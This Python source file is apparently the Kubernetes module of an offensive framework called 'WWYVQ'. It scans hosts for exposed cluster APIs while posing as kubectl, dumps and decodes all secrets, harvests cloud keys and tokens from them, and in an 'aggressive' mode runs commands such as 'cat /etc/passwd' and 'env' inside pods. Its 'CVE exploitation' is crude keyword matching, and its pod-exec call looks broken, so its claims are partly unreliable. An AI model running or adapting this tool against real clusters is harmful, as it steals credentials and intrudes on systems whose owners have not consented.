#!/usr/bin/env python3
"""
🥷 WWYVQ Framework v2.1 - Kubernetes Exploitation Module
Ultra-Organized Architecture - Advanced K8s Exploitation

THE MOST IMPORTANT MODULE - Focus on Kubernetes exploitation

Features:
- Kubernetes cluster detection and reconnaissance
- Pod exploitation and privilege escalation
- Service account enumeration
- Secret and ConfigMap extraction
- RBAC enumeration
- Network policy analysis
- CVE-specific exploits
- Stealth techniques
"""

import asyncio
import json
import base64
import yaml
import re
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from enum import Enum
import aiohttp
from urllib.parse import urljoin, urlparse


class K8sExploitType(Enum):
    """Kubernetes exploit types"""
    CLUSTER_SCAN = "cluster_scan"
    POD_EXPLOIT = "pod_exploit"
    SERVICE_ACCOUNT_ENUM = "service_account_enum"
    SECRET_EXTRACTION = "secret_extraction"
    RBAC_ENUM = "rbac_enum"
    NETWORK_POLICY = "network_policy"
    CVE_EXPLOIT = "cve_exploit"
    PRIVILEGE_ESCALATION = "privilege_escalation"


@dataclass
class K8sCluster:
    """Kubernetes cluster information"""
    endpoint: str
    version: str = ""
    status: str = "unknown"
    accessible: bool = False
    anonymous_access: bool = False
    service_accounts: List[str] = None
    secrets: List[Dict[str, Any]] = None
    pods: List[Dict[str, Any]] = None
    rbac_info: Dict[str, Any] = None
    vulnerabilities: List[str] = None
    metadata: Dict[str, Any] = None
    
    def __post_init__(self):
        if self.service_accounts is None:
            self.service_accounts = []
        if self.secrets is None:
            self.secrets = []
        if self.pods is None:
            self.pods = []
        if self.rbac_info is None:
            self.rbac_info = {}
        if self.vulnerabilities is None:
            self.vulnerabilities = []
        if self.metadata is None:
            self.metadata = {}


@dataclass
class K8sExploitResult:
    """Kubernetes exploitation result"""
    exploit_type: K8sExploitType
    target: str
    success: bool
    data: Dict[str, Any]
    credentials: List[Dict[str, Any]] = None
    recommendations: List[str] = None
    severity: str = "medium"
    
    def __post_init__(self):
        if self.credentials is None:
            self.credentials = []
        if self.recommendations is None:
            self.recommendations = []


class ExploitModule:
    """
    Advanced Kubernetes exploitation module
    
    THE CORE OF WWYVQ v2.1 - Focus on Kubernetes exploitation
    """
    
    def __init__(self, config_manager, logger, engine):
        """Initialize exploit module"""
        self.config_manager = config_manager
        self.logger = logger
        self.engine = engine
        self.config = config_manager.get_config().exploit
        
        # HTTP session for API calls
        self.session = None
        
        # Kubernetes-specific patterns
        self.k8s_patterns = {
            'api_endpoints': [
                '/api/v1',
                '/api/v1/namespaces',
                '/api/v1/pods',
                '/api/v1/services',
                '/api/v1/secrets',
                '/api/v1/configmaps',
                '/api/v1/serviceaccounts',
                '/apis/rbac.authorization.k8s.io/v1'
            ],
            'ports': [6443, 10250, 2379, 2380, 8080, 8443],
            'user_agents': [
                'kubectl/v1.28.0',
                'kubernetes-client/v1.28.0',
                'kube-apiserver/v1.28.0'
            ]
        }
        
        # CVE patterns
        self.cve_patterns = {
            'CVE-2025-24884': {
                'description': 'Kubernetes Audit Log Exposure',
                'endpoints': ['/api/v1/events', '/logs/audit.log'],
                'method': 'GET'
            },
            'CVE-2025-24514': {
                'description': 'Ingress-NGINX Injection',
                'endpoints': ['/api/v1/ingresses'],
                'method': 'GET'
            },
            'CVE-2025-32963': {
                'description': 'MinIO STS Misconfiguration',
                'endpoints': ['/minio/sts', '/sts'],
                'method': 'GET'
            }
        }
        
        # Statistics
        self.stats = {
            'clusters_found': 0,
            'pods_exploited': 0,
            'secrets_extracted': 0,
            'service_accounts_found': 0,
            'cves_exploited': 0,
            'credentials_found': 0
        }
        
        self.logger.info("🥷 Kubernetes Exploitation Module initialized")
    
    async def scan_targets(self, targets: List[str], mode, **kwargs) -> Dict[str, Any]:
        """Scan targets for Kubernetes clusters"""
        results = {'results': [], 'errors': []}
        
        # Initialize HTTP session
        await self._init_session()
        
        try:
            # Scan each target
            for target in targets:
                try:
                    cluster_info = await self._scan_k8s_cluster(target)
                    if cluster_info:
                        results['results'].append({
                            'type': 'kubernetes_cluster',
                            'target': target,
                            'cluster_info': cluster_info
                        })
                        self.stats['clusters_found'] += 1
                
                except Exception as e:
                    self.logger.error(f"Failed to scan target {target}: {e}")
                    results['errors'].append(f"Target {target}: {e}")
        
        finally:
            await self._close_session()
        
        return results
    
    async def exploit_targets(self, targets: List[str], mode, **kwargs) -> Dict[str, Any]:
        """Exploit Kubernetes targets"""
        results = {'results': [], 'errors': []}
        
        # Initialize HTTP session
        await self._init_session()
        
        try:
            # Exploit each target
            for target in targets:
                try:
                    # Comprehensive K8s exploitation
                    exploit_results = await self._exploit_k8s_comprehensive(target, mode)
                    
                    if exploit_results:
                        results['results'].extend(exploit_results)
                
                except Exception as e:
                    self.logger.error(f"Failed to exploit target {target}: {e}")
                    results['errors'].append(f"Target {target}: {e}")
        
        finally:
            await self._close_session()
        
        return results
    
    async def _init_session(self):
        """Initialize HTTP session"""
        if not self.session:
            connector = aiohttp.TCPConnector(
                limit=100,
                limit_per_host=10,
                ttl_dns_cache=300,
                ssl=False,  # Allow self-signed certificates
                verify_ssl=False
            )
            
            timeout = aiohttp.ClientTimeout(total=30)
            
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers={
                    'User-Agent': 'kubectl/v1.28.0'
                }
            )
    
    async def _close_session(self):
        """Close HTTP session"""
        if self.session:
            await self.session.close()
            self.session = None
    
    async def _scan_k8s_cluster(self, target: str) -> Optional[K8sCluster]:
        """Scan for Kubernetes cluster"""
        try:
            # Parse target
            if not target.startswith(('http://', 'https://')):
                # Try both HTTP and HTTPS
                for protocol in ['https', 'http']:
                    test_target = f"{protocol}://{target}"
                    cluster = await self._probe_k8s_endpoint(test_target)
                    if cluster:
                        return cluster
            else:
                return await self._probe_k8s_endpoint(target)
        
        except Exception as e:
            self.logger.error(f"Failed to scan K8s cluster {target}: {e}")
        
        return None
    
    async def _probe_k8s_endpoint(self, endpoint: str) -> Optional[K8sCluster]:
        """Probe Kubernetes endpoint"""
        try:
            # Try common Kubernetes ports
            parsed = urlparse(endpoint)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            # If no port specified, try common K8s ports
            if not parsed.port:
                for port in self.k8s_patterns['ports']:
                    test_url = f"{parsed.scheme}://{parsed.hostname}:{port}"
                    cluster = await self._check_k8s_api(test_url)
                    if cluster:
                        return cluster
            else:
                return await self._check_k8s_api(base_url)
        
        except Exception as e:
            self.logger.debug(f"Failed to probe K8s endpoint {endpoint}: {e}")
        
        return None
    
    async def _check_k8s_api(self, base_url: str) -> Optional[K8sCluster]:
        """Check if endpoint is a Kubernetes API"""
        try:
            # Try to access /api/v1
            api_url = urljoin(base_url, '/api/v1')
            
            async with self.session.get(api_url) as response:
                if response.status == 200:
                    # This is likely a Kubernetes API
                    cluster = K8sCluster(
                        endpoint=base_url,
                        status="accessible",
                        accessible=True
                    )
                    
                    # Get version info
                    version_url = urljoin(base_url, '/version')
                    try:
                        async with self.session.get(version_url) as ver_response:
                            if ver_response.status == 200:
                                version_data = await ver_response.json()
                                cluster.version = version_data.get('gitVersion', 'unknown')
                    except:
                        pass
                    
                    # Check for anonymous access
                    if response.status == 200:
                        cluster.anonymous_access = True
                    
                    self.logger.info(f"🎯 Kubernetes cluster found: {base_url}")
                    return cluster
                
                elif response.status == 401:
                    # Authentication required but still K8s
                    cluster = K8sCluster(
                        endpoint=base_url,
                        status="requires_auth",
                        accessible=False
                    )
                    self.logger.info(f"🔒 Kubernetes cluster (auth required): {base_url}")
                    return cluster
        
        except Exception as e:
            self.logger.debug(f"Not a K8s API: {base_url} - {e}")
        
        return None
    
    async def _exploit_k8s_comprehensive(self, target: str, mode) -> List[Dict[str, Any]]:
        """Comprehensive Kubernetes exploitation"""
        results = []
        
        # First, scan for cluster
        cluster = await self._scan_k8s_cluster(target)
        if not cluster:
            return results
        
        # If cluster is accessible, perform exploitation
        if cluster.accessible:
            # 1. Enumerate service accounts
            sa_results = await self._enumerate_service_accounts(cluster)
            results.extend(sa_results)
            
            # 2. Extract secrets
            secret_results = await self._extract_secrets(cluster)
            results.extend(secret_results)
            
            # 3. Enumerate pods
            pod_results = await self._enumerate_pods(cluster)
            results.extend(pod_results)
            
            # 4. Check RBAC
            rbac_results = await self._check_rbac(cluster)
            results.extend(rbac_results)
            
            # 5. CVE exploitation
            cve_results = await self._exploit_cves(cluster)
            results.extend(cve_results)
            
            # 6. Pod exploitation
            if mode and hasattr(mode, 'value') and mode.value == 'aggressive':
                pod_exploit_results = await self._exploit_pods(cluster)
                results.extend(pod_exploit_results)
        
        return results
    
    async def _enumerate_service_accounts(self, cluster: K8sCluster) -> List[Dict[str, Any]]:
        """Enumerate service accounts"""
        results = []
        
        try:
            sa_url = urljoin(cluster.endpoint, '/api/v1/serviceaccounts')
            
            async with self.session.get(sa_url) as response:
                if response.status == 200:
                    data = await response.json()
                    service_accounts = data.get('items', [])
                    
                    for sa in service_accounts:
                        sa_name = sa.get('metadata', {}).get('name', 'unknown')
                        namespace = sa.get('metadata', {}).get('namespace', 'default')
                        
                        cluster.service_accounts.append(f"{namespace}/{sa_name}")
                        
                        # Check for secrets
                        secrets = sa.get('secrets', [])
                        if secrets:
                            for secret in secrets:
                                secret_name = secret.get('name', '')
                                results.append({
                                    'type': 'service_account_secret',
                                    'target': cluster.endpoint,
                                    'service_account': f"{namespace}/{sa_name}",
                                    'secret_name': secret_name,
                                    'namespace': namespace
                                })
                    
                    self.stats['service_accounts_found'] += len(service_accounts)
                    
                    self.logger.info(f"🔍 Found {len(service_accounts)} service accounts")
        
        except Exception as e:
            self.logger.error(f"Failed to enumerate service accounts: {e}")
        
        return results
    
    async def _extract_secrets(self, cluster: K8sCluster) -> List[Dict[str, Any]]:
        """Extract secrets from cluster"""
        results = []
        
        try:
            secrets_url = urljoin(cluster.endpoint, '/api/v1/secrets')
            
            async with self.session.get(secrets_url) as response:
                if response.status == 200:
                    data = await response.json()
                    secrets = data.get('items', [])
                    
                    for secret in secrets:
                        secret_name = secret.get('metadata', {}).get('name', 'unknown')
                        namespace = secret.get('metadata', {}).get('namespace', 'default')
                        secret_type = secret.get('type', 'unknown')
                        
                        # Extract secret data
                        secret_data = secret.get('data', {})
                        decoded_data = {}
                        
                        for key, value in secret_data.items():
                            try:
                                decoded_data[key] = base64.b64decode(value).decode('utf-8')
                            except:
                                decoded_data[key] = value
                        
                        # Check for interesting secrets
                        if self._is_interesting_secret(secret_name, secret_type, decoded_data):
                            result = {
                                'type': 'kubernetes_secret',
                                'target': cluster.endpoint,
                                'secret_name': secret_name,
                                'namespace': namespace,
                                'secret_type': secret_type,
                                'data': decoded_data,
                                'severity': 'high'
                            }
                            
                            results.append(result)
                            cluster.secrets.append(result)
                            self.stats['secrets_extracted'] += 1
                            
                            # Check for credentials
                            creds = self._extract_credentials_from_secret(decoded_data)
                            if creds:
                                result['credentials'] = creds
                                self.stats['credentials_found'] += len(creds)
                    
                    self.logger.info(f"🔐 Extracted {len(results)} interesting secrets")
        
        except Exception as e:
            self.logger.error(f"Failed to extract secrets: {e}")
        
        return results
    
    def _is_interesting_secret(self, name: str, secret_type: str, data: Dict[str, Any]) -> bool:
        """Check if secret is interesting"""
        interesting_patterns = [
            'token', 'password', 'key', 'secret', 'credential',
            'aws', 'azure', 'gcp', 'docker', 'registry',
            'database', 'db', 'mongo', 'redis', 'postgres',
            'smtp', 'mail', 'api', 'webhook'
        ]
        
        # Check name
        name_lower = name.lower()
        for pattern in interesting_patterns:
            if pattern in name_lower:
                return True
        
        # Check type
        if secret_type in ['kubernetes.io/service-account-token', 'kubernetes.io/dockercfg']:
            return True
        
        # Check data keys
        for key in data.keys():
            key_lower = key.lower()
            for pattern in interesting_patterns:
                if pattern in key_lower:
                    return True
        
        return False
    
    def _extract_credentials_from_secret(self, data: Dict[str, Any]) -> List[Dict[str, str]]:
        """Extract credentials from secret data"""
        credentials = []
        
        # Common credential patterns
        cred_patterns = {
            'aws_access_key_id': r'AKIA[0-9A-Z]{16}',
            'aws_secret_access_key': r'[A-Za-z0-9/+=]{40}',
            'docker_password': r'password',
            'database_url': r'(postgresql|mysql|mongodb)://[^/]+',
            'api_key': r'[A-Za-z0-9]{32,}',
            'token': r'[A-Za-z0-9._-]{20,}'
        }
        
        for key, value in data.items():
            if isinstance(value, str):
                # Check for specific patterns
                for cred_type, pattern in cred_patterns.items():
                    if re.search(pattern, value):
                        credentials.append({
                            'type': cred_type,
                            'key': key,
                            'value': value
                        })
                        break
        
        return credentials
    
    async def _enumerate_pods(self, cluster: K8sCluster) -> List[Dict[str, Any]]:
        """Enumerate pods"""
        results = []
        
        try:
            pods_url = urljoin(cluster.endpoint, '/api/v1/pods')
            
            async with self.session.get(pods_url) as response:
                if response.status == 200:
                    data = await response.json()
                    pods = data.get('items', [])
                    
                    for pod in pods:
                        pod_name = pod.get('metadata', {}).get('name', 'unknown')
                        namespace = pod.get('metadata', {}).get('namespace', 'default')
                        
                        # Check for privileged pods
                        if self._is_privileged_pod(pod):
                            results.append({
                                'type': 'privileged_pod',
                                'target': cluster.endpoint,
                                'pod_name': pod_name,
                                'namespace': namespace,
                                'severity': 'high'
                            })
                        
                        cluster.pods.append({
                            'name': pod_name,
                            'namespace': namespace,
                            'pod_data': pod
                        })
                    
                    self.logger.info(f"📦 Found {len(pods)} pods")
        
        except Exception as e:
            self.logger.error(f"Failed to enumerate pods: {e}")
        
        return results
    
    def _is_privileged_pod(self, pod: Dict[str, Any]) -> bool:
        """Check if pod is privileged"""
        spec = pod.get('spec', {})
        
        # Check security context
        security_context = spec.get('securityContext', {})
        if security_context.get('privileged', False):
            return True
        
        # Check containers
        containers = spec.get('containers', [])
        for container in containers:
            container_security = container.get('securityContext', {})
            if container_security.get('privileged', False):
                return True
            
            # Check for host access
            if container_security.get('hostNetwork', False):
                return True
            if container_security.get('hostPID', False):
                return True
        
        return False
    
    async def _check_rbac(self, cluster: K8sCluster) -> List[Dict[str, Any]]:
        """Check RBAC permissions"""
        results = []
        
        try:
            rbac_url = urljoin(cluster.endpoint, '/apis/rbac.authorization.k8s.io/v1/clusterroles')
            
            async with self.session.get(rbac_url) as response:
                if response.status == 200:
                    data = await response.json()
                    roles = data.get('items', [])
                    
                    for role in roles:
                        role_name = role.get('metadata', {}).get('name', 'unknown')
                        rules = role.get('rules', [])
                        
                        # Check for dangerous permissions
                        for rule in rules:
                            resources = rule.get('resources', [])
                            verbs = rule.get('verbs', [])
                            
                            if '*' in resources and '*' in verbs:
                                results.append({
                                    'type': 'dangerous_rbac',
                                    'target': cluster.endpoint,
                                    'role_name': role_name,
                                    'permissions': 'cluster-admin',
                                    'severity': 'critical'
                                })
                    
                    self.logger.info(f"🔒 Checked RBAC for {len(roles)} roles")
        
        except Exception as e:
            self.logger.error(f"Failed to check RBAC: {e}")
        
        return results
    
    async def _exploit_cves(self, cluster: K8sCluster) -> List[Dict[str, Any]]:
        """Exploit known CVEs"""
        results = []
        
        for cve_id, cve_info in self.cve_patterns.items():
            try:
                for endpoint in cve_info['endpoints']:
                    test_url = urljoin(cluster.endpoint, endpoint)
                    
                    async with self.session.get(test_url) as response:
                        if response.status == 200:
                            data = await response.text()
                            
                            # Check for CVE-specific patterns
                            if await self._check_cve_pattern(cve_id, data):
                                results.append({
                                    'type': 'cve_exploit',
                                    'target': cluster.endpoint,
                                    'cve_id': cve_id,
                                    'description': cve_info['description'],
                                    'endpoint': endpoint,
                                    'severity': 'high'
                                })
                                
                                cluster.vulnerabilities.append(cve_id)
                                self.stats['cves_exploited'] += 1
                                
                                self.logger.warning(f"🚨 CVE {cve_id} detected: {cve_info['description']}")
            
            except Exception as e:
                self.logger.debug(f"CVE check failed for {cve_id}: {e}")
        
        return results
    
    async def _check_cve_pattern(self, cve_id: str, data: str) -> bool:
        """Check for CVE-specific patterns"""
        if cve_id == 'CVE-2025-24884':
            # Check for audit log exposure
            return 'audit' in data.lower() or 'event' in data.lower()
        
        elif cve_id == 'CVE-2025-24514':
            # Check for ingress-nginx
            return 'ingress' in data.lower() or 'nginx' in data.lower()
        
        elif cve_id == 'CVE-2025-32963':
            # Check for MinIO STS
            return 'minio' in data.lower() or 'sts' in data.lower()
        
        return False
    
    async def _exploit_pods(self, cluster: K8sCluster) -> List[Dict[str, Any]]:
        """Exploit pods (aggressive mode)"""
        results = []
        
        for pod_info in cluster.pods:
            try:
                pod_name = pod_info['name']
                namespace = pod_info['namespace']
                
                # Try to execute commands in pod
                exec_url = urljoin(
                    cluster.endpoint,
                    f'/api/v1/namespaces/{namespace}/pods/{pod_name}/exec'
                )
                
                # Try common commands
                commands = [
                    'whoami',
                    'id',
                    'cat /etc/passwd',
                    'ls -la /',
                    'env'
                ]
                
                for cmd in commands:
                    try:
                        params = {
                            'command': cmd,
                            'stdout': 'true',
                            'stderr': 'true'
                        }
                        
                        async with self.session.post(exec_url, params=params) as response:
                            if response.status == 200:
                                output = await response.text()
                                
                                results.append({
                                    'type': 'pod_exploitation',
                                    'target': cluster.endpoint,
                                    'pod_name': pod_name,
                                    'namespace': namespace,
                                    'command': cmd,
                                    'output': output,
                                    'severity': 'high'
                                })
                                
                                self.stats['pods_exploited'] += 1
                                break
                    
                    except Exception as e:
                        self.logger.debug(f"Command execution failed: {e}")
            
            except Exception as e:
                self.logger.error(f"Failed to exploit pod {pod_info['name']}: {e}")
        
        return results
    
    async def get_statistics(self) -> Dict[str, Any]:
        """Get module statistics"""
        return self.stats.copy()
    
    async def shutdown(self):
        """Shutdown module"""
        await self._close_session()
        self.logger.info("🛑 Kubernetes Exploitation Module shutdown completed")